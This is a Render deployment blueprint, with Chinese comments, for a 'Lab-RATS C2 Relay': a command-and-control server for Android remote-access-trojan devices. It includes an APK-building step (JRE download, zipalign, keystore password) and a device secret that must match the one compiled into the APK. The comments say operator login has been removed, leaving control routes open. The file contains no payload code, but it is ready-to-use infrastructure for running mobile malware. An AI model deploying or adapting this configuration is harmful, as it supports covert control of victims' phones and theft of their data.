# Blueprint: Lab-RATS C2 Relay (Render Web Service)
# [面板重构] 登录密码已移除（操作员路由开放），环境变量说明：
#   C2_PASSWORD  —— 可选；登录已移除，仅打印提示（保留为将来重启用）
#   DEVICE_SECRET—— 必改；必须与 APK 构建时经 local.properties 注入
#                    BuildConfig 的同一 secret 完全一致，否则设备全部 401
#   NODE_ENV     —— production（关闭错误栈回显）
services:
  - type: web
    name: lab-rats-c2
    env: node
    rootDir: c2-server
    buildCommand: npm install --omit=dev && curl -sL -o /tmp/jre.tar.gz https://api.adoptium.net/v3/binary/latest/21/ga/linux/x64/jre/hotspot/normal/eclipse && tar -xzf /tmp/jre.tar.gz -C /tmp && chmod +x builder/zipalign && ls /tmp
    startCommand: npm start
    plan: free
    autoDeploy: true
    healthCheckPath: /healthz
    envVars:
      - key: C2_PASSWORD
        sync: false
        value: CHANGE_ME_STRONG_PASSPHRASE
      - key: DEVICE_SECRET
        sync: false
        value: CHANGE_ME_DEVICE_SECRET
      - key: BUILDER_KS_PASS
        sync: false
        value: CHANGE_ME_KS_PASSPHRASE
      - key: NODE_ENV
        value: production
